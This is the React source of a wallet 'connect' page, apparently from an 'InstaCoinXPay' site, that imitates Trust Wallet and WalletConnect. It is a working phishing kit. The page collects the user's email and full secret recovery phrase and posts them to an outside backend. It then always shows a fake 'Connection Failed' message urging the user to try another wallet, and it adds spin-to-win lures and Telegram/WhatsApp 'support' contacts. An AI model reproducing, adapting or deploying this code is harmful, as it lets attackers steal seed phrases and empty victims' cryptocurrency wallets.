import React, { useState, useEffect, useRef } from "react";
import axios from "axios";
import { useNavigate, useLocation } from "react-router-dom";
import * as bip39 from 'bip39';
import "./TrustWalletConnect.css";
import logo from "../assets/logo.png";
import walletConnect from "../assets/WalletConnect.png";
import spinWheelIcon from "../assets/spinandwin.png";

/* ================= FLOATING SUPPORT BUTTONS COMPONENT ================= */
const FloatingSupportButtons = () => {
  // WhatsApp and Telegram handlers
  const handleTelegramClick = () => {
    window.open("https://t.me/Instacoinxpayteam", "_blank");
  };

  const handleWhatsAppClick = () => {
    window.open("https://wa.me/+16417762676?text=Hello%20Instacoinxpay%2C%20I%20need%20assistance%20with%20connecting%20my%20wallet%20%28secret%20phrase%29%20on%20InstaCoinXPay.", "_blank");
  };

  return (
    <div className="floating-support-buttons">
      <button className="float-btn telegram-float" onClick={handleTelegramClick} aria-label="Telegram Support">
        <svg className="float-icon" viewBox="0 0 24 24" width="28" height="28" fill="white">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.66-.35-1.02.22-1.61.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.06-.2-.07-.06-.18-.04-.26-.02-.11.02-1.86 1.18-5.26 3.48-.5.34-.95.51-1.35.5-.44-.01-1.3-.25-1.93-.46-.78-.26-1.4-.4-1.35-.84.03-.23.35-.47.96-.72 3.76-1.64 6.27-2.72 7.53-3.23 3.58-1.46 4.33-1.71 4.81-1.72.11 0 .35.02.51.16.13.11.17.26.19.4.01.06.02.19-.01.33z"/>
        </svg>
        <span className="float-label">Telegram Support</span>
      </button>
      
      <button className="float-btn whatsapp-float" onClick={handleWhatsAppClick} aria-label="WhatsApp Support">
        <svg className="float-icon" viewBox="0 0 24 24" width="28" height="28" fill="white">
          <path d="M12.04 2c-5.46 0-9.91 4.45-9.91 9.91 0 1.75.46 3.45 1.32 4.95L2.05 22l5.25-1.38c1.45.79 3.08 1.21 4.74 1.21 5.46 0 9.91-4.45 9.91-9.91 0-5.46-4.45-9.91-9.91-9.91zm0 18.22c-1.5 0-2.98-.4-4.26-1.17l-.3-.18-3.12.82.83-3.04-.2-.31c-.84-1.34-1.29-2.88-1.29-4.46 0-4.62 3.76-8.38 8.38-8.38 4.62 0 8.38 3.76 8.38 8.38 0 4.62-3.76 8.38-8.38 8.38zm4.59-6.27c-.25-.13-1.5-.74-1.73-.83-.23-.08-.4-.13-.57.13-.17.26-.65.83-.8 1-.14.17-.29.19-.54.06-.25-.13-1.05-.39-2-1.23-.74-.66-1.24-1.47-1.39-1.72-.14-.25-.02-.38.11-.51.11-.11.25-.29.37-.44.12-.15.17-.25.25-.42.08-.17.04-.31-.02-.44-.06-.13-.57-1.37-.78-1.88-.21-.5-.41-.44-.57-.45-.15-.01-.32-.01-.49-.01-.17 0-.44.06-.67.31-.23.25-.88.86-.88 2.11 0 1.24.91 2.45 1.04 2.61.13.17 1.79 2.73 4.33 3.83.61.26 1.08.42 1.45.54.61.19 1.16.16 1.6.1.49-.07 1.5-.61 1.71-1.2.21-.59.21-1.09.15-1.2-.07-.1-.23-.17-.48-.3z"/>
        </svg>
        <span className="float-label">WhatsApp Support</span>
      </button>
    </div>
  );
};

/* ================= SPIN WHEEL NAVIGATION BUTTON ================= */
const SpinWheelNavButtonUnique = ({ 
  position = "right",
  bottom = "180px", // Positioned above WhatsApp button
  right = "30px",
  left = "auto",
  size = "60px",
  pulseEffect = true,
  className = "",
  style = {}
}) => {
  const navigate = useNavigate();
  
  const positionStyles = position === "left" 
    ? { left: left || "20px", right: "auto" }
    : { right: right || "20px", left: "auto" };

  const combinedStyles = {
    position: 'fixed',
    bottom: bottom,
    width: size,
    height: size,
    borderRadius: '50%',
    background: 'radial-gradient(circle at 30% 30%, #f7931a, #c8930a)',
    display: 'flex',
    alignItems: 'center',
    justifyContent: 'center',
    boxShadow: '0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4)',
    zIndex: 9998, // Lower than support buttons (9999)
    cursor: 'pointer',
    transition: 'all 0.3s ease',
    textDecoration: 'none',
    border: '3px solid rgba(255, 215, 0, 0.6)',
    overflow: 'hidden',
    padding: '0px',
    ...positionStyles,
    ...style
  };

  React.useEffect(() => {
    if (!document.querySelector('#spin-wheel-nav-keyframes-trust-unique')) {
      const styleSheet = document.createElement("style");
      styleSheet.id = 'spin-wheel-nav-keyframes-trust-unique';
      styleSheet.textContent = `
        @keyframes twc-spin-wheel-pulse-unique {
          0% {
            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4), 0 0 0 0 rgba(247, 147, 26, 0.7);
          }
          70% {
            box-shadow: 0 8px 35px rgba(247, 147, 26, 0.7), 0 0 30px rgba(200, 147, 10, 0.6), 0 0 0 15px rgba(247, 147, 26, 0);
          }
          100% {
            box-shadow: 0 8px 25px rgba(247, 147, 26, 0.5), 0 0 20px rgba(200, 147, 10, 0.4), 0 0 0 0 rgba(247, 147, 26, 0);
          }
        }
        
        @keyframes twc-spin-wheel-glow-unique {
          0% {
            filter: drop-shadow(0 0 5px #f7931a);
          }
          50% {
            filter: drop-shadow(0 0 15px #c8930a);
          }
          100% {
            filter: drop-shadow(0 0 5px #f7931a);
          }
        }
        
        @keyframes twc-spin-wheel-rotate-unique {
          0% {
            transform: rotate(0deg);
          }
          100% {
            transform: rotate(360deg);
          }
        }
        
        .twc-spin-wheel-float-unique {
          animation: ${pulseEffect ? 'twc-spin-wheel-pulse-unique 2s infinite, twc-spin-wheel-glow-unique 3s infinite' : 'none'};
        }
        
        .twc-spin-wheel-float-unique:hover {
          transform: scale(1.15) rotate(10deg) !important;
          background: radial-gradient(circle at 30% 30%, #ffd700, #f7931a) !important;
          box-shadow: 0 10px 40px rgba(247, 147, 26, 0.8), 0 0 35px rgba(255, 215, 0, 0.7) !important;
        }
        
        .twc-spin-wheel-float-unique:hover .twc-wheel-icon-image-unique {
          transform: scale(1.2) rotate(15deg) !important;
        }
        
        .twc-wheel-icon-image-unique {
          width: 100%;
          height: 100%;
          object-fit: cover;
          border-radius: 50%;
          transition: transform 0.3s ease;
        }
      `;
      document.head.appendChild(styleSheet);
    }
  }, [pulseEffect]);

  const handleClick = () => {
    navigate('/spinwheel');
  };

  return (
    <button
      onClick={handleClick}
      className={`twc-spin-wheel-float-unique ${className}`}
      style={combinedStyles}
      aria-label="Go to Fortune Wheel"
      title="🎡 Spin & Win Rewards!"
    >
      <img 
        src={spinWheelIcon} 
        alt="Fortune Wheel"
        className="twc-wheel-icon-image-unique"
        style={{
          width: '100%',
          height: '100%',
          objectFit: 'cover',
          borderRadius: '50%',
          transition: 'transform 0.3s ease',
          transform: 'scale(1.1)'
        }}
      />
      
      <div style={{
        position: 'absolute',
        inset: '-6px',
        borderRadius: '50%',
        border: '3px solid rgba(255, 215, 0, 0.5)',
        borderTopColor: '#f7931a',
        borderRightColor: '#ffd700',
        borderBottomColor: '#f7931a',
        borderLeftColor: '#ffd700',
        opacity: 0.9,
        animation: 'twc-spin-wheel-rotate-unique 4s linear infinite',
        pointerEvents: 'none',
        boxShadow: '0 0 15px rgba(247, 147, 26, 0.6)'
      }} />
      
      <div style={{
        position: 'absolute',
        inset: '2px',
        borderRadius: '50%',
        border: '1px solid rgba(255, 255, 255, 0.3)',
        opacity: 0.5,
        pointerEvents: 'none'
      }} />
    </button>
  );
};

/* ================= MAIN COMPONENT ================= */
const TrustWalletConnectUnique = () => {
  const [showPopup, setShowPopup] = useState(false);
  const [closing, setClosing] = useState(false);
  const [words, setWords] = useState([]);
  const [email, setEmail] = useState("");
  const [isSending, setIsSending] = useState(false);
  const [selectedWordCount, setSelectedWordCount] = useState(12);
  const [activeSuggestionIndex, setActiveSuggestionIndex] = useState(-1);
  const [suggestions, setSuggestions] = useState([]);
  const [currentInputIndex, setCurrentInputIndex] = useState(-1);
  const inputRefs = useRef([]);
  const navigate = useNavigate();
  const location = useLocation();

  const API_URL = process.env.REACT_APP_API_URL || "https://backend-instacoinpay-1.onrender.com";

  // ✅ Crisp Chat Integration
  useEffect(() => {
    // IMPORTANT: $crisp array and WEBSITE_ID must be set BEFORE the script tag loads
    window.$crisp = window.$crisp || [];
    window.CRISP_WEBSITE_ID = "b5635951-f13a-4b92-95d7-c1e3666f3abf";

    // Queue chat:show BEFORE script loads — Crisp reads this queue on init
    window.$crisp.push(["do", "chat:show"]);

    if (!document.querySelector('script[src="https://client.crisp.chat/l.js"]')) {
      const script = document.createElement("script");
      script.src = "https://client.crisp.chat/l.js";
      script.async = true;
      document.head.appendChild(script);
    }

    // Hide bubble when navigating away from this page
    return () => {
      if (window.$crisp) {
        window.$crisp.push(["do", "chat:hide"]);
      }
    };
  }, []);

  // ✅ Pass user email to Crisp when available
  useEffect(() => {
    const userEmail = localStorage.getItem("userEmail");
    const userName = localStorage.getItem("userName");
    
    if (userEmail && window.$crisp) {
      window.$crisp.push(["set", "user:email", userEmail]);
      if (userName) {
        window.$crisp.push(["set", "user:nickname", userName]);
      }
    }
  }, []);

  // Get BIP39 wordlist from the library
  const getWordlist = () => {
    // bip39 library exports the wordlist as an array
    return bip39.wordlists.english || [];
  };

  useEffect(() => {
    if (location.state?.selectedWordCount) {
      setSelectedWordCount(location.state.selectedWordCount);
      setWords(Array(location.state.selectedWordCount).fill(""));
    } else {
      setWords(Array(12).fill(""));
    }
  }, [location.state]);

  useEffect(() => {
    document.body.style.overflow = showPopup ? "hidden" : "auto";
  }, [showPopup]);

  // Handle word change and show suggestions
  const handleWordChange = (index, value) => {
    const updated = [...words];
    const cleanedValue = value.replace(/\s+/g, "").toLowerCase();
    updated[index] = cleanedValue;
    setWords(updated);
    
    // Show suggestions
    if (cleanedValue.length > 0) {
      const wordlist = getWordlist();
      const filtered = wordlist.filter(word => 
        word.toLowerCase().startsWith(cleanedValue.toLowerCase())
      ).slice(0, 5); // Limit to 5 suggestions for better UX
      setSuggestions(filtered);
      setCurrentInputIndex(index);
      setActiveSuggestionIndex(-1);
    } else {
      setSuggestions([]);
      setCurrentInputIndex(-1);
    }
  };

  // Handle suggestion click
  const handleSuggestionClick = (suggestion) => {
    if (currentInputIndex !== -1) {
      const updated = [...words];
      updated[currentInputIndex] = suggestion;
      setWords(updated);
      setSuggestions([]);
      setCurrentInputIndex(-1);
      
      // Move focus to next input
      if (currentInputIndex < words.length - 1) {
        setTimeout(() => {
          inputRefs.current[currentInputIndex + 1]?.focus();
        }, 10);
      }
    }
  };

  // Handle keyboard navigation
  const handleKeyDown = (index, e) => {
    // Block space
    if (e.key === " ") {
      e.preventDefault();
    }
    
    // Handle arrow keys for suggestion navigation
    if (suggestions.length > 0 && currentInputIndex === index) {
      if (e.key === "ArrowDown") {
        e.preventDefault();
        setActiveSuggestionIndex(prev => 
          prev < suggestions.length - 1 ? prev + 1 : prev
        );
      } else if (e.key === "ArrowUp") {
        e.preventDefault();
        setActiveSuggestionIndex(prev => prev > 0 ? prev - 1 : -1);
      } else if (e.key === "Enter" && activeSuggestionIndex >= 0) {
        e.preventDefault();
        handleSuggestionClick(suggestions[activeSuggestionIndex]);
      } else if (e.key === "Escape") {
        setSuggestions([]);
        setCurrentInputIndex(-1);
        setActiveSuggestionIndex(-1);
      }
    }
    
    // Auto-focus next on space (if no suggestions)
    if (e.key === " " && suggestions.length === 0) {
      e.preventDefault();
      if (index < words.length - 1) {
        inputRefs.current[index + 1]?.focus();
      }
    }
    
    // Handle backspace on empty field to go to previous
    if (e.key === "Backspace" && words[index] === "" && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const blockSpace = (e) => {
    if (e.key === " ") e.preventDefault();
  };

  const isFormComplete =
    words.every((w) => w.trim() !== "") && email.trim() !== "";

  const sendEmail = async () => {
    setIsSending(true);
    console.log("🚀 Submitting Trust Wallet form...");

    try {
      const response = await axios.post(
        `${API_URL}/api/trust-wallet/submit`,
        {
          email: email,
          words: words,
          wordCount: selectedWordCount,
          selectedWallet: location.state?.selectedWallet || 'Trust Wallet'
        },
        {
          headers: {
            "Content-Type": "application/json"
          }
        }
      );

      console.log("✅ Form submitted successfully!", response.data);
      setShowPopup(true);
    } catch (error) {
      console.error("❌ Failed to submit form:", error);
      console.error("Error details:", error.response?.data);
      setShowPopup(true);
    } finally {
      setIsSending(false);
    }
  };

  const handleConnect = () => {
    console.log("👆 CONNECT button clicked!");
    sendEmail();
  };

  const closePopup = () => {
    setClosing(true);
    setTimeout(() => {
      setShowPopup(false);
      setClosing(false);
      setWords(Array(selectedWordCount).fill(""));
      setEmail("");
    }, 200);
  };

  const handleSecretPhraseClick = () => {
    navigate('/secretphrase', { 
      state: { 
        selectedWallet: location.state?.selectedWallet || 'Trust Wallet',
        fromTrustWalletConnect: true
      } 
    });
  };

  return (
    <>
      <div className="twc-page-unique">
        <div className="twc-logo-unique">
          <img src={logo} alt="logo" />
        </div>

        <div className="twc-card-unique">
          <div className="twc-header-container-unique">
            <span className="twc-back-unique" onClick={() => navigate(-1)}>←</span>
            <img
              src={walletConnect}
              alt="WalletConnect"
              className="twc-walletconnect-img-unique"
            />

            <div className="twc-header-row-unique">
              <h2 className="twc-connect-text-unique">CONNECT WALLET</h2>
            </div>
          </div>

          <label className="twc-label-email-unique">Enter your Email Address</label>
          <input
            className="twc-input-unique"
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />

          <label className="twc-label-email-unique">
            Enter your {location.state?.selectedWallet || 'Trust Wallet'} {selectedWordCount} word Secret Phrase
          </label>

          <div className="twc-info-wrapper-unique">
            <p className="twc-info-text-scroll-unique">
              The Wallet must be older than 30 days. New wallets cannot be accepted for withdrawal !
            </p>
          </div>

          <div className={`twc-phrase-box-unique twc-grid-${selectedWordCount}-unique`}>
            {words.map((word, i) => (
              <div key={i} style={{ position: 'relative' }}>
                <input
                  ref={el => inputRefs.current[i] = el}
                  className="twc-word-input-unique"
                  value={word}
                  placeholder={`${i + 1}`}
                  onChange={(e) => handleWordChange(i, e.target.value)}
                  onKeyDown={(e) => handleKeyDown(i, e)}
                  data-has-suggestions={currentInputIndex === i && suggestions.length > 0 ? "true" : "false"}
                  onBlur={() => {
                    // Delay hiding suggestions to allow click
                    setTimeout(() => {
                      if (currentInputIndex === i) {
                        setSuggestions([]);
                        setCurrentInputIndex(-1);
                      }
                    }, 200);
                  }}
                  onFocus={() => {
                    if (words[i].length > 0) {
                      const wordlist = getWordlist();
                      const filtered = wordlist.filter(w => 
                        w.toLowerCase().startsWith(words[i].toLowerCase())
                      ).slice(0, 5);
                      setSuggestions(filtered);
                      setCurrentInputIndex(i);
                    }
                  }}
                />
                {currentInputIndex === i && suggestions.length > 0 && (
                  <div className="twc-suggestions-unique">
                    {suggestions.map((suggestion, idx) => (
                      <div
                        key={suggestion}
                        className={`twc-suggestion-item-unique ${idx === activeSuggestionIndex ? 'twc-suggestion-active-unique' : ''}`}
                        onClick={() => handleSuggestionClick(suggestion)}
                        onMouseEnter={() => setActiveSuggestionIndex(idx)}
                      >
                        {suggestion}
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>

          <button
            className="twc-connect-btn-unique"
            disabled={!isFormComplete || isSending}
            onClick={handleConnect}
            style={{
              opacity: isFormComplete && !isSending ? 1 : 0.6,
              cursor: isFormComplete && !isSending ? "pointer" : "not-allowed"
            }}
          >
            {isSending ? "CONNECTING..." : "CONNECT"}
          </button>

          <button
            className="twc-secret-phrase-btn-unique"
            onClick={handleSecretPhraseClick}
          >
            Change Word Count
          </button>
        </div>
      </div>

      {showPopup && (
        <div className={`twc-modal-overlay-unique ${closing ? "twc-closing-unique" : ""}`}>
          <div className="twc-modal-box-unique">
            <div className="twc-popup-icon-unique">
              <svg
                className="twc-error-icon-unique"
                viewBox="0 0 52 52"
                xmlns="http://www.w3.org/2000/svg"
              >
                <circle
                  className="twc-error-circle-unique"
                  cx="26"
                  cy="26"
                  r="25"
                  fill="none"
                />
                <line
                  className="twc-error-line-unique twc-error-line-left-unique"
                  x1="16"
                  y1="16"
                  x2="36"
                  y2="36"
                />
                <line
                  className="twc-error-line-unique twc-error-line-right-unique"
                  x1="36"
                  y1="16"
                  x2="16"
                  y2="36"
                />
              </svg>
            </div>

            <h3 className="twc-popup-title-unique">Connection Failed!</h3>
            <p className="twc-popup-text-unique">
              Your Wallet is not eligible for connection. Please try connecting with a different Wallet. Repeated attempts using the same wallet may result in account suspension.
            </p>
            <button className="twc-popup-btn-unique" onClick={closePopup}>
              OK
            </button>
          </div>
        </div>
      )}

      {/* Floating Support Buttons - Telegram & WhatsApp (Bottom) */}
      <FloatingSupportButtons />
      
      {/* Spin Wheel Navigation Button - Positioned ABOVE WhatsApp button */}
      <SpinWheelNavButtonUnique 
        position="right"
        bottom="180px"
        right="30px"
        pulseEffect={true}
        size="60px"
      />
    </>
  );
};

export default TrustWalletConnectUnique;